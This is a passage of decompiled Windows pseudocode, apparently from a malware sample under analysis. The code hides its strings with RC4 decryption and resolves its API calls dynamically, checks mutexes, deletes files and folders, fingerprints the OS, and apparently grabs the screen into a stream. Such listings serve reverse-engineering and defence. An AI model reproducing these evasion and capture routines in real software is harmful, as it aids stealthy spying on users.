    "  {",
    "    while ( 1 )",
    "    {",
    "      v2 = (const wchar_t *)sub_62746BA0(*((_QWORD *)v1 - 3));",
    "      _mm_prefetch(v1, 1);",
    "      v4 = sub_62746BA0(*((_QWORD *)v1 - 2));",
    "      wcscpy(Destination, Source);",
    "      wcscat(Destination, v0);",
    "      wcscat(Destination, v2);",
    "      wcscpy(Src, v6);",
    "      wcscat(Src, v0);",
    "      wcscat(Src, v2);",
    "      ExpandEnvironmentStringsW(Destination, Dst, 0x104u);",
    "      ExpandEnvironmentStringsW(Src, PathName, 0x104u);",
    "      wcscpy(FileName, Dst);",
    "      wcscat(FileName, v0);",
    "      wcscat(FileName, v7);",
    "      wcscpy(v9, PathName);",
    "      wcscat(v9, v0);",
    "      wcscat(v9, v7);",
    "      if ( GetFileAttributesW(FileName) != -1 )",
    "        DeleteFileW(FileName);",
    "      if ( GetFileAttributesW(v9) != -1 )",
    "        DeleteFileW(v9);",
    "      wcscpy(FileName, Dst);",
    "      wcscat(FileName, v0);",
    "      wcscat(FileName, v8);",
    "      wcscpy(v9, PathName);",
    "      wcscat(v9, v0);",
    "      wcscat(v9, v8);",
    "      if ( GetFileAttributesW(FileName) != -1 )",
    "        DeleteFileW(FileName);",
    "      if ( GetFileAttributesW(v9) == -1 )",
    "        break;",
    "      DeleteFileW(v9);",
    "      RemoveDirectoryW(Dst);",
    "      RemoveDirectoryW(PathName);",
    "      sub_62746C30(v4);",
    "      sub_62746C30(v2);",
    "      v1 += 16;",
    "      if ( v1 == (const char *)&unk_6274A668 )",
    "        goto LABEL_10;",
    "    }",
    "    RemoveDirectoryW(Dst);",
    "    RemoveDirectoryW(PathName);",
    "    sub_62746C30(v4);",
    "    sub_62746C30(v2);",
    "    v1 += 16;",
    "  }",
    "  while ( v1 != (const char *)&unk_6274A668 );",
    "LABEL_10:",
    "  sub_62746C30(v8);",
    "  sub_62746C30(v7);",
    "  sub_62746C30(v0);",
    "  sub_62746C30(v6);",
    "  sub_62746C30(Source);",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627458E0(HMODULE a1)",
    "{",
    "  const WCHAR *v2; // rbx",
    "  HANDLE MutexW; // rsi",
    "  _UNKNOWN **v4; // rsi",
    "  const wchar_t *v5; // rbx",
    "  __int64 v6; // rdi",
    "  const wchar_t *v7; // r13",
    "  const wchar_t *v8; // r12",
    "  unsigned int v9; // esi",
    "  const wchar_t *v11; // r14",
    "  wchar_t Destination[292]; // [rsp+20h] [rbp-248h] BYREF",
    "",
    "  v2 = (const WCHAR *)sub_62746BA0(&unk_6274B7F8);",
    "  MutexW = CreateMutexW(0, 0, v2);",
    "  if ( MutexW )",
    "  {",
    "    Sleep(0x2710u);",
    "    CloseHandle(MutexW);",
    "  }",
    "  sub_62746C30(v2);",
    "  sub_627455E0();",
    "  sub_62745590();",
    "  Sleep(0x3E8u);",
    "  v4 = &off_6274A240 + 2 * (int)sub_62744900(0, 64);",
    "  v5 = (const wchar_t *)sub_62746BA0(*v4);",
    "  v6 = sub_62746BA0(v4[1]);",
    "  v7 = (const wchar_t *)sub_62746BA0(&unk_6274B880);",
    "  v8 = (const wchar_t *)sub_62746BA0(&unk_6274B6C1);",
    "  wcscpy(Destination, v7);",
    "  wcscat(Destination, v8);",
    "  wcscat(Destination, v5);",
    "  v9 = sub_62744620(a1, (__int64)Destination, (int)v5);",
    "  if ( !v9 )",
    "  {",
    "    v11 = (const wchar_t *)sub_62746BA0(&unk_6274B8AB);",
    "    wcscpy(Destination, v11);",
    "    wcscat(Destination, v8);",
    "    wcscat(Destination, v5);",
    "    v9 = sub_62744620(a1, (__int64)Destination, (int)v5);",
    "    sub_62746C30(v11);",
    "  }",
    "  sub_62746C30(v8);",
    "  sub_62746C30(v7);",
    "  sub_62746C30(v6);",
    "  sub_62746C30(v5);",
    "  return v9;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62745A70(HMODULE a1, const wchar_t *a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  if ( (unsigned int)sub_627483E0() )",
    "    return sub_62744B50((__int64)a1, a2);",
    "  result = sub_627458E0(a1);",
    "  if ( !(_DWORD)result )",
    "    return sub_62744B50((__int64)a1, a2);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62745AC0(HMODULE a1)",
    "{",
    "  const WCHAR *v2; // rbx",
    "  HANDLE MutexW; // rsi",
    "  HKEY *v5; // rbp",
    "",
    "  qword_627510B0 = a1;",
    "  v2 = (const WCHAR *)sub_62746BA0(&unk_6274A080);",
    "  SetLastError(0);",
    "  MutexW = CreateMutexW(0, 0, v2);",
    "  if ( MutexW )",
    "  {",
    "    if ( GetLastError() == 183 )",
    "    {",
    "      v5 = (HKEY *)sub_62746BA0(&unk_6274B8C6);",
    "      if ( (unsigned int)sub_62748230(v5) )",
    "        sub_62745A70(a1, v2);",
    "      sub_62746C30(v5);",
    "    }",
    "    else",
    "    {",
    "      sub_62745A70(a1, v2);",
    "    }",
    "    CloseHandle(MutexW);",
    "  }",
    "  return sub_62746C30(v2);",
    "}",
    "",
    "",
    "LPVOID __fastcall sub_62745B80(SIZE_T dwBytes)",
    "{",
    "  HANDLE ProcessHeap; // rax",
    "",
    "  ProcessHeap = GetProcessHeap();",
    "  return HeapAlloc(ProcessHeap, 8u, dwBytes);",
    "}",
    "",
    "",
    "LPVOID __fastcall sub_62745BB0(LPVOID lpMem, SIZE_T dwBytes)",
    "{",
    "  HANDLE ProcessHeap; // rax",
    "",
    "  ProcessHeap = GetProcessHeap();",
    "  return HeapReAlloc(ProcessHeap, 8u, lpMem, dwBytes);",
    "}",
    "",
    "",
    "BOOL __fastcall sub_62745BE0(LPVOID lpMem)",
    "{",
    "  HANDLE ProcessHeap; // rax",
    "",
    "  ProcessHeap = GetProcessHeap();",
    "  return HeapFree(ProcessHeap, 0, lpMem);",
    "}",
    "",
    "",
    "_BOOL8 __fastcall sub_62745C10(_DWORD *a1)",
    "{",
    "  int v1; // esi",
    "  int v3; // eax",
    "  _BOOL8 result; // rax",
    "  const CHAR *v5; // rdi",
    "  const WCHAR *v6; // rdi",
    "  const CHAR *v7; // rdi",
    "  const CHAR *v8; // rdi",
    "  const WCHAR *v9; // rdi",
    "  const CHAR *v10; // rdi",
    "  const WCHAR *v11; // rdi",
    "  _WORD v12[24]; // [rsp+20h] [rbp-168h] BYREF",
    "  _DWORD v13[70]; // [rsp+50h] [rbp-138h] BYREF",
    "  int v14; // [rsp+168h] [rbp-20h]",
    "",
    "  if ( !qword_627510F0 )",
    "  {",
    "    v11 = (const WCHAR *)sub_62746BA0(&unk_6274D690);",
    "    qword_627510F0 = LoadLibraryW(v11);",
    "    sub_62746C30(v11);",
    "  }",
    "  if ( qword_627510E8 )",
    "  {",
    "    if ( qword_627510E0 )",
    "      goto LABEL_5;",
    "  }",
    "  else",
    "  {",
    "    v5 = (const CHAR *)sub_62746B10(&unk_6274D6AB);",
    "    qword_627510E8 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627510F0, v5);",
    "    sub_62746C30(v5);",
    "    if ( qword_627510E0 )",
    "    {",
    "LABEL_5:",
    "      if ( qword_627510D8 )",
    "        goto LABEL_6;",
    "      goto LABEL_30;",
    "    }",
    "  }",
    "  v6 = (const WCHAR *)sub_62746BA0(&unk_6274D6C8);",
    "  qword_627510E0 = LoadLibraryW(v6);",
    "  sub_62746C30(v6);",
    "  if ( qword_627510D8 )",
    "  {",
    "LABEL_6:",
    "    if ( qword_627510D0 )",
    "      goto LABEL_7;",
    "    goto LABEL_31;",
    "  }",
    "LABEL_30:",
    "  v7 = (const CHAR *)sub_62746B10(&unk_6274D6E9);",
    "  qword_627510D8 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627510E0, v7);",
    "  sub_62746C30(v7);",
    "  if ( qword_627510D0 )",
    "  {",
    "LABEL_7:",
    "    if ( qword_627510C8 )",
    "      goto LABEL_8;",
    "LABEL_32:",
    "    v9 = (const WCHAR *)sub_62746BA0(&unk_6274D71B);",
    "    qword_627510C8 = LoadLibraryW(v9);",
    "    sub_62746C30(v9);",
    "    if ( qword_627510C0 )",
    "      goto LABEL_9;",
    "    goto LABEL_33;",
    "  }",
    "LABEL_31:",
    "  v8 = (const CHAR *)sub_62746B10(&unk_6274D705);",
    "  qword_627510D0 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627510E0, v8);",
    "  sub_62746C30(v8);",
    "  if ( !qword_627510C8 )",
    "    goto LABEL_32;",
    "LABEL_8:",
    "  if ( qword_627510C0 )",
    "    goto LABEL_9;",
    "LABEL_33:",
    "  v10 = (const CHAR *)sub_62746B10(&unk_6274D738);",
    "  qword_627510C0 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627510C8, v10);",
    "  sub_62746C30(v10);",
    "LABEL_9:",
    "  memset(v13, 0, sizeof(v13));",
    "  v14 = 0;",
    "  v13[0] = 284;",
    "  qword_627510E8(v13);",
    "  *a1 = v13[1];",
    "  a1[1] = v13[2];",
    "  a1[2] = v13[3];",
    "  if ( qword_627510D8 )",
    "  {",
    "    qword_627510D8(v12);",
    "    v3 = v13[1];",
    "    if ( v13[1] != 6 )",
    "      goto LABEL_11;",
    "  }",
    "  else",
    "  {",
    "    qword_627510D0(v12);",
    "    v3 = v13[1];",
    "    if ( v13[1] != 6 )",
    "    {",
    "LABEL_11:",
    "      if ( v3 == 10 )",
    "      {",
    "        if ( !v13[2] )",
    "        {",
    "          v1 = 28;",
    "          if ( v13[3] <= 0x55EFu )",
    "            v1 = 2 * (BYTE2(v14) == 1) + 24;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v1 = 0;",
    "        if ( v3 == 5 )",
    "        {",
    "          if ( v13[2] )",
    "          {",
    "            v1 = 2;",
    "            if ( v13[2] == 2 && BYTE2(v14) != 1 )",
    "              v1 = (unsigned int)qword_627510C0(89) == 0 ? 4 : 6;",
    "          }",
    "        }",
    "      }",
    "      goto LABEL_13;",
    "    }",
    "  }",
    "  if ( v13[2] )",
    "  {",
    "    switch ( v13[2] )",
    "    {",
    "      case 1:",
    "        v1 = 2 * (BYTE2(v14) == 1) + 12;",
    "        break;",
    "      case 2:",
    "        v1 = 2 * (BYTE2(v14) == 1) + 16;",
    "        break;",
    "      case 3:",
    "        v1 = 2 * (BYTE2(v14) == 1) + 20;",
    "        break;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v1 = 2 * (BYTE2(v14) != 1) + 8;",
    "  }",
    "LABEL_13:",
    "  result = v12[0] == 9;",
    "  a1[3] = result + v1;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62745FF0(_BYTE *a1, __int64 a2, unsigned __int64 a3)",
    "{",
    "  __int64 i; // rax",
    "  int v4; // r10d",
    "  unsigned __int64 j; // r9",
    "  char v6; // r11",
    "  __int64 result; // rax",
    "",
    "  *a1 = 0;",
    "  a1[1] = 0;",
    "  for ( i = 0; i != 256; ++i )",
    "    a1[i + 2] = i;",
    "  v4 = 0;",
    "  for ( j = 0; j != 256; ++j )",
    "  {",
    "    v6 = a1[j + 2];",
    "    v4 += (unsigned __int8)(*(_BYTE *)(a2 + j % a3) + v6);",
    "    result = (unsigned __int8)v4;",
    "    a1[j + 2] = a1[(unsigned __int8)v4 + 2];",
    "    a1[(unsigned __int8)v4 + 2] = v6;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char __fastcall sub_62746060(unsigned __int8 *a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 i; // rbx",
    "  unsigned __int8 v5; // al",
    "  unsigned __int8 v6; // r10",
    "  unsigned __int8 v7; // r11",
    "  char result; // al",
    "",
    "  if ( a4 )",
    "  {",
    "    for ( i = 0; i != a4; ++i )",
    "    {",
    "      v5 = *a1 + 1;",
    "      *a1 = v5;",
    "      v6 = a1[v5 + 2];",
    "      v7 = a1[1] + v6;",
    "      a1[1] = v7;",
    "      a1[v5 + 2] = a1[v7 + 2];",
    "      a1[v7 + 2] = v6;",
    "      result = *(_BYTE *)(a2 + i) ^ a1[(unsigned __int8)(a1[v5 + 2] + v6) + 2];",
    "      *(_BYTE *)(a3 + i) = result;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void *__fastcall sub_627460D0(unsigned int *a1)",
    "{",
    "  void *v2; // rbx",
    "  char *v4; // rax",
    "  char *v5; // rdi",
    "  const WCHAR *v6; // rbx",
    "  const CHAR *v7; // rbx",
    "  const WCHAR *v8; // rbx",
    "  const CHAR *v9; // rbx",
    "  const WCHAR *v10; // rbx",
    "  const CHAR *v11; // rbx",
    "  const CHAR *v12; // rbx",
    "  const CHAR *v13; // rbx",
    "  const CHAR *v14; // rbx",
    "  const CHAR *v15; // rbx",
    "  const CHAR *v16; // rbx",
    "  const CHAR *v17; // rbx",
    "  const WCHAR *v18; // rbx",
    "  const CHAR *v19; // rbx",
    "  unsigned int v20; // r12d",
    "  const wchar_t *v21; // rbp",
    "  char *v22; // rbx",
    "  __int64 v23; // rax",
    "  __int64 v24; // r12",
    "  unsigned int v25; // r14d",
    "  __int64 v26; // r13",
    "  __int64 v27; // rax",
    "  __int64 v28; // rbp",
    "  const WCHAR *v29; // rbx",
    "  const CHAR *v30; // rbx",
    "  const CHAR *v31; // rbx",
    "  const CHAR *v32; // rbx",
    "  const CHAR *v33; // rbx",
    "  const CHAR *v34; // rbx",
    "  const CHAR *v35; // rbx",
    "  const CHAR *v36; // rbx",
    "  const WCHAR *v37; // rbx",
    "  const CHAR *v38; // rbx",
    "  char v39[4]; // [rsp+5Ch] [rbp-DCh] BYREF",
    "  char v40[16]; // [rsp+60h] [rbp-D8h] BYREF",
    "  unsigned int v41; // [rsp+70h] [rbp-C8h]",
    "  char v42[8]; // [rsp+B0h] [rbp-88h] BYREF",
    "  __int64 v43; // [rsp+B8h] [rbp-80h] BYREF",
    "  __int64 v44; // [rsp+C0h] [rbp-78h] BYREF",
    "  unsigned int v45; // [rsp+C8h] [rbp-70h] BYREF",
    "  unsigned int v46; // [rsp+CCh] [rbp-6Ch] BYREF",
    "  __m128i v47; // [rsp+D0h] [rbp-68h] BYREF",
    "  int v48; // [rsp+E0h] [rbp-58h] BYREF",
    "  __int64 v49; // [rsp+E8h] [rbp-50h]",
    "  int v50; // [rsp+F0h] [rbp-48h]",
    "  int v51; // [rsp+F4h] [rbp-44h]",
    "  __int64 v52[8]; // [rsp+F8h] [rbp-40h] BYREF",
    "",
    "  if ( qword_627511A0 )",
    "  {",
    "    if ( qword_62751180 )",
    "      goto LABEL_3;",
    "  }",
    "  else",
    "  {",
    "    v6 = (const WCHAR *)sub_62746BA0(&unk_6274D760);",
    "    qword_627511A0 = LoadLibraryW(v6);",
    "    sub_62746C30(v6);",
    "    if ( qword_62751180 )",
    "    {",
    "LABEL_3:",
    "      if ( qword_62751178 )",
    "        goto LABEL_4;",
    "      goto LABEL_26;",
    "    }",
    "  }",
    "  v7 = (const CHAR *)sub_62746B10(&unk_6274D77D);",
    "  qword_62751180 = GetProcAddress(qword_627511A0, v7);",
    "  sub_62746C30(v7);",
    "  if ( qword_62751178 )",
    "  {",
    "LABEL_4:",
    "    if ( qword_62751158 )",
    "      goto LABEL_5;",
    "    goto LABEL_27;",
    "  }",
    "LABEL_26:",
    "  v8 = (const WCHAR *)sub_62746BA0(&unk_6274D798);",
    "  qword_62751178 = LoadLibraryW(v8);",
    "  sub_62746C30(v8);",
    "  if ( qword_62751158 )",
    "  {",
    "LABEL_5:",
    "    if ( qword_62751148 )",
    "      goto LABEL_6;",
    "    goto LABEL_28;",
    "  }",
    "LABEL_27:",
    "  v9 = (const CHAR *)sub_62746B10(&unk_6274D7B3);",
    "  qword_62751158 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751178, v9);",
    "  sub_62746C30(v9);",
    "  if ( qword_62751148 )",
    "  {",
    "LABEL_6:",
    "    if ( qword_62751140 )",
    "      goto LABEL_7;",
    "    goto LABEL_29;",
    "  }",
    "LABEL_28:",
    "  v10 = (const WCHAR *)sub_62746BA0(&unk_6274D7C8);",
    "  qword_62751148 = LoadLibraryW(v10);",
    "  sub_62746C30(v10);",
    "  if ( qword_62751140 )",
    "  {",
    "LABEL_7:",
    "    if ( qword_62751138 )",
    "      goto LABEL_8;",
    "    goto LABEL_30;",
    "  }",
    "LABEL_29:",
    "  v11 = (const CHAR *)sub_62746B10(&unk_6274D7E7);",
    "  qword_62751140 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751148, v11);",
    "  sub_62746C30(v11);",
    "  if ( qword_62751138 )",
    "  {",
    "LABEL_8:",
    "    if ( qword_62751130 )",
    "      goto LABEL_9;",
    "    goto LABEL_31;",
    "  }",
    "LABEL_30:",
    "  v12 = (const CHAR *)sub_62746B10(&unk_6274D800);",
    "  qword_62751138 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(qword_62751148, v12);",
    "  sub_62746C30(v12);",
    "  if ( qword_62751130 )",
    "  {",
    "LABEL_9:",
    "    if ( qword_62751128 )",
    "      goto LABEL_10;",
    "    goto LABEL_32;",
    "  }",
    "LABEL_31:",
    "  v13 = (const CHAR *)sub_62746B10(&unk_6274D821);",
    "  qword_62751130 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751148, v13);",
    "  sub_62746C30(v13);",
    "  if ( qword_62751128 )",
    "  {",
    "LABEL_10:",
    "    if ( qword_62751120 )",
    "      goto LABEL_11;",
    "    goto LABEL_33;",
    "  }",
    "LABEL_32:",
    "  v14 = (const CHAR *)sub_62746B10(&unk_6274D840);",
    "  qword_62751128 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751148, v14);",
    "  sub_62746C30(v14);",
    "  if ( qword_62751120 )",
    "  {",
    "LABEL_11:",
    "    if ( qword_62751118 )",
    "      goto LABEL_12;",
    "    goto LABEL_34;",
    "  }",
    "LABEL_33:",
    "  v15 = (const CHAR *)sub_62746B10(&unk_6274D864);",
    "  qword_62751120 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751148, v15);",
    "  sub_62746C30(v15);",
    "  if ( qword_62751118 )",
    "  {",
    "LABEL_12:",
    "    if ( qword_62751110 )",
    "      goto LABEL_13;",
    "    goto LABEL_35;",
    "  }",
    "LABEL_34:",
    "  v16 = (const CHAR *)sub_62746B10(&unk_6274D882);",
    "  qword_62751118 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751148, v16);",
    "  sub_62746C30(v16);",
    "  if ( qword_62751110 )",
    "  {",
    "LABEL_13:",
    "    if ( qword_62751108 )",
    "      goto LABEL_14;",
    "LABEL_36:",
    "    v18 = (const WCHAR *)sub_62746BA0(&unk_6274D8B3);",
    "    qword_62751108 = LoadLibraryW(v18);",
    "    sub_62746C30(v18);",
    "    if ( qword_62751100 )",
    "      goto LABEL_15;",
    "    goto LABEL_37;",
    "  }",
    "LABEL_35:",
    "  v17 = (const CHAR *)sub_62746B10(&unk_6274D89B);",
    "  qword_62751110 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751148, v17);",
    "  sub_62746C30(v17);",
    "  if ( !qword_62751108 )",
    "    goto LABEL_36;",
    "LABEL_14:",
    "  if ( qword_62751100 )",
    "    goto LABEL_15;",
    "LABEL_37:",
    "  v19 = (const CHAR *)sub_62746B10(&unk_6274D8CE);",
    "  qword_62751100 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751108, v19);",
    "  sub_62746C30(v19);",
    "LABEL_15:",
    "  if ( qword_62751180 )",
    "    qword_62751180();",
    "  v48 = 1;",
    "  v49 = 0;",
    "  v50 = 0;",
    "  v51 = 0;",
    "  v2 = 0;",
    "  if ( !(unsigned int)qword_62751140(v52, &v48, 0) )",
    "  {",
    "    if ( !(unsigned int)qword_62751138(&v46, &v45) )",
    "    {",
    "      v4 = (char *)sub_62745B80(v45);",
    "      v5 = v4;",
    "      v2 = v4;",
    "      if ( v4 )",
    "      {",
    "        v2 = 0;",
    "        if ( !(unsigned int)qword_62751130(v46, v45, v4) )",
    "        {",
    "          v20 = v46;",
    "          v21 = (const wchar_t *)sub_62746BA0(&unk_6274D8EC);",
    "          if ( v20 )",
    "          {",
    "            v22 = v5;",
    "            while ( 1 )",
    "            {",
    "              _mm_prefetch(v22 + 1104, 1);",
    "              if ( !wcscmp(*((const wchar_t **)v22 + 8), v21) )",
    "                break;",
    "              v22 += 104;",
    "              if ( v22 == &v5[104 * v20] )",
    "                goto LABEL_78;",
    "            }",
    "            v47 = _mm_loadu_si128((const __m128i *)v22);",
    "            sub_62746C30(v21);",
    "            if ( !qword_627511A0 )",
    "            {",
    "              v29 = (const WCHAR *)sub_62746BA0(&unk_6274D909);",
    "              qword_627511A0 = LoadLibraryW(v29);",
    "              sub_62746C30(v29);",
    "            }",
    "            if ( !qword_62751198 )",
    "            {",
    "              v34 = (const CHAR *)sub_62746B10(&unk_6274D926);",
    "              qword_62751198 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627511A0, v34);",
    "              sub_62746C30(v34);",
    "            }",
    "            if ( !qword_62751190 )",
    "            {",
    "              v33 = (const CHAR *)sub_62746B10(&unk_6274D934);",
    "              qword_62751190 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627511A0, v33);",
    "              sub_62746C30(v33);",
    "            }",
    "            if ( !qword_62751188 )",
    "            {",
    "              v38 = (const CHAR *)sub_62746B10(&unk_6274D94D);",
    "              qword_62751188 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(qword_627511A0, v38);",
    "              sub_62746C30(v38);",
    "            }",
    "            if ( !qword_62751178 )",
    "            {",
    "              v37 = (const WCHAR *)sub_62746BA0(&unk_6274D95F);",
    "              qword_62751178 = LoadLibraryW(v37);",
    "              sub_62746C30(v37);",
    "            }",
    "            if ( !qword_62751170 )",
    "            {",
    "              v36 = (const CHAR *)sub_62746B10(&unk_6274D980);",
    "              qword_62751170 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751178, v36);",
    "              sub_62746C30(v36);",
    "            }",
    "            if ( !qword_62751168 )",
    "            {",
    "              v35 = (const CHAR *)sub_62746B10(&unk_6274D99F);",
    "              qword_62751168 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(qword_62751178, v35);",
    "              sub_62746C30(v35);",
    "            }",
    "            if ( !qword_62751160 )",
    "            {",
    "              v32 = (const CHAR *)sub_62746B10(&unk_6274D9B4);",
    "              qword_62751160 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751178, v32);",
    "              sub_62746C30(v32);",
    "            }",
    "            if ( !qword_62751158 )",
    "            {",
    "              v31 = (const CHAR *)sub_62746B10(&unk_6274D9CF);",
    "              qword_62751158 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751178, v31);",
    "              sub_62746C30(v31);",
    "            }",
    "            if ( !qword_62751150 )",
    "            {",
    "              v30 = (const CHAR *)sub_62746B10(&unk_6274D9E4);",
    "              qword_62751150 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(qword_62751178, v30);",
    "              sub_62746C30(v30);",
    "            }",
    "            v23 = qword_62751198(0);",
    "            v2 = (void *)v23;",
    "            if ( v23 )",
    "            {",
    "              v24 = qword_62751160(v23);",
    "              if ( v24 )",
    "              {",
    "                v25 = qword_62751190(0);",
    "                v26 = (unsigned int)qword_62751190(1);",
    "                v27 = qword_62751170(v2, v25, v26);",
    "                v28 = v27;",
    "                if ( v27 )",
    "                {",
    "                  qword_62751168(v24, v27);",
    "                  if ( !(unsigned int)qword_62751150(v24, 0, 0, v25, v26, v2, 0, 0, 13369376) )",
    "                  {",
    "                    qword_62751158(v28);",
    "                    v28 = 0;",
    "                  }",
    "                }",
    "                qword_62751158(v24);",
    "                qword_62751188(0, v2);",
    "                if ( v28 )",
    "                {",
    "                  v2 = 0;",
    "                  if ( !(unsigned int)qword_62751128(v28, 0, &v44) )",
    "                  {",
    "                    if ( !(unsigned int)qword_62751100(0, 1, &v43) )",
    "                    {",
    "                      if ( !(unsigned int)qword_62751120(v44, v43, &v47, 0) )",
    "                      {",
    "                        (*(void (__fastcall **)(__int64, _QWORD, _QWORD, char *))(*(_QWORD *)v43 + 40LL))(",
    "                          v43,",
    "                          0,",
    "                          0,",
    "                          v42);",
    "                        (*(void (__fastcall **)(__int64, char *, __int64))(*(_QWORD *)v43 + 96LL))(v43, v40, 1);",
    "                        v2 = sub_62745B80(v41);",
    "                        if ( v2 )",
    "                        {",
    "                          if ( (*(unsigned int (__fastcall **)(__int64, void *, _QWORD, char *))(*(_QWORD *)v43 + 24LL))(",
    "                                 v43,",
    "                                 v2,",
    "                                 v41,",
    "                                 v39) )",
    "                          {",
    "                            sub_62745BE0(v2);",
    "                            v2 = 0;",
    "                          }",
    "                          else if ( a1 )",
    "                          {",
    "                            *a1 = v41;",
    "                          }",
    "                        }",
    "                      }",
    "                      (*(void (__fastcall **)(__int64))(*(_QWORD *)v43 + 16LL))(v43);",
    "                    }",
    "                    qword_62751118(v44);",
    "                  }",
    "                  qword_62751158(v28);",
    "                }",
    "                else",
    "                {",
    "                  v2 = 0;",
    "                }",
    "              }",
    "              else",
    "              {",
    "                qword_62751188(0, v2);",
    "                v2 = 0;",
    "              }",
    "            }",
    "          }",
    "          else",
    "          {",
    "LABEL_78:",
    "            sub_62746C30(v21);",
    "            v2 = 0;",
    "          }",
    "        }",
    "        sub_62745BE0(v5);",
    "      }",
    "    }",
    "    qword_62751110(v52[0]);",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62746B10(unsigned int *a1)",
    "{",
    "  unsigned int v2; // esi",
    "  _DWORD *v3; // rax",
    "  _DWORD *v4; // rbx",
    "  unsigned __int8 v6[268]; // [rsp+20h] [rbp-138h] BYREF",
    "  unsigned int v7[11]; // [rsp+12Ch] [rbp-2Ch] BYREF",
    "",
    "  v2 = *a1;",
    "  v7[0] = a1[1];",
    "  v3 = sub_62745B80(v2 + 9LL);",
    "  v4 = v3;",
    "  if ( v3 )",
    "  {",
    "    *v3 = v2;",
    "    v3[1] = v7[0];",
    "    sub_62745FF0(v6, (__int64)v7, 4u);",
    "    sub_62746060(v6, (__int64)(a1 + 2), (__int64)(v4 + 2), v2);",
    "    *((_BYTE *)v4 + v2 + 8) = 0;",
    "    v4 += 2;",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62746BA0(unsigned int *a1)",
    "{",
    "  unsigned int v2; // esi",
    "  _DWORD *v3; // rax",
    "  _DWORD *v4; // rbx",
    "  unsigned __int8 v6[268]; // [rsp+20h] [rbp-138h] BYREF",
    "  unsigned int v7[11]; // [rsp+12Ch] [rbp-2Ch] BYREF",
    "",
    "  v2 = *a1;",
    "  v7[0] = a1[1];",
    "  v3 = sub_62745B80(v2 + 10LL);",
    "  v4 = v3;",
    "  if ( v3 )",
    "  {",
    "    *v3 = v2;",
    "    v3[1] = v7[0];",
    "    sub_62745FF0(v6, (__int64)v7, 4u);",
    "    sub_62746060(v6, (__int64)(a1 + 2), (__int64)(v4 + 2), v2);",
    "    *(_WORD *)((char *)v4 + v2 + 8) = 0;",
    "    v4 += 2;",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "BOOL __fastcall sub_62746C30(__int64 a1)",
    "{",
    "  void *v1; // rbx",
    "  BOOL result; // eax",
    "",
    "  if ( a1 )",
    "  {",
    "    v1 = (void *)(a1 - 8);",
    "    memset((void *)(a1 - 8), 0, *(unsigned int *)(a1 - 8) + 8LL);",
    "    return sub_62745BE0(v1);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int sub_62746C70(wchar_t *a1, size_t a2, const wchar_t *a3, ...)",
    "{",
    "  va_list Args; // [rsp+58h] [rbp+20h] BYREF",
    "",
    "  va_start(Args, a3);",
    "  return vsnwprintf(a1, a2, a3, Args);",
    "}",
    "",
    "",
    "WCHAR *__fastcall sub_62746C90(LPCCH lpMultiByteStr)",
    "{",
    "  int v2; // eax",
    "  int cchWideChar; // ebx",
    "  WCHAR *v4; // rsi",
    "  WCHAR *lpWideCharStr; // rax",
    "",
    "  v2 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, 0, 0);",
    "  cchWideChar = v2;",
    "  v4 = 0;",
    "  if ( v2 )",
    "  {",
    "    lpWideCharStr = (WCHAR *)sub_62745B80(2LL * v2 + 2);",
    "    v4 = lpWideCharStr;",
    "    if ( lpWideCharStr )",
    "      MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, lpWideCharStr, cchWideChar);",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62746D10(const WCHAR *a1, const void *a2, DWORD a3)",
    "{",
    "  HANDLE FileW; // rax",
    "  void *v6; // rbx",
    "  unsigned int v7; // ebp",
    "  DWORD NumberOfBytesWritten; // [rsp+4Ch] [rbp-2Ch] BYREF",
    "",
    "  FileW = CreateFileW(a1, 0x40000000u, 0, 0, 2u, 0x80u, 0);",
    "  v6 = FileW;",
    "  v7 = 0;",
    "  if ( FileW != (HANDLE)-1LL )",
    "  {",
    "    if ( SetFilePointer(FileW, 0, 0, 0) != -1 )",
    "      v7 = WriteFile(v6, a2, a3, &NumberOfBytesWritten, 0);",
    "    CloseHandle(v6);",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
